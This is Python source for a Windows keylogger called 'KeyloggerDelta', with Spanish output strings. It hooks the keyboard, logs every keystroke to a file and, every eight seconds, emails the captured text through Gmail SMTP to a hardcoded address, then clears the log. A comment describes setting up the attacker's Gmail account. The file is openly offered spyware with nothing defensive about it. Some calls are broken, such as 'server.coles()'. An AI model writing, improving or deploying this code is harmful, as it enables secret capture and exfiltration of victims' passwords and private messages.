import pyHook, pythoncom, sys, logging, time, datetime

destination_folder= 'C:\Users\Windows_11\Documents\HK_Code\Python_tools\KeyloggerDelta-2.0V\KeyloggerDelta_v2.6.0'
seconds_wait= 8
timeout= time.time()+ seconds_wait

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def SendEmail():
    with open(destination_folder, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = data.replace('Space', ' ')
        data = data.replace('\n', '')
        data = 'Mensaje capturado a las: '+ fecha + '\n' + data
        print (data)
        crearEmail('DeltaLoggerXM@gmail.com', '1234Delta', 'DeltaLoggerXM@gmail.com', 'Ha sido Capturado Delta:' + fecha, data)
        f.seek(0)   ##EXAMPLE: Creation of Gmail + Password + Gmail Attacker / Verification of Response Key
        f.truncate()

def crearEmail(user, passw, recep, subj, body):
    import smtplib
    mailUser = user
    mailPass = passw
    From = user
    To = recep
    Subject = subj
    txt = body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, txt)

    try:
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.coles()
        print('Email enviado con exito')

    except:
        print('CAPTURA DELTA FALLIDA')

def OnKeyboardEvent(event):
    logging.basicConfig(filename=destination_folder, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        SendEmail()
        timeout= time.time()+ seconds_wait

    pythoncom.PumpWaitingMessage()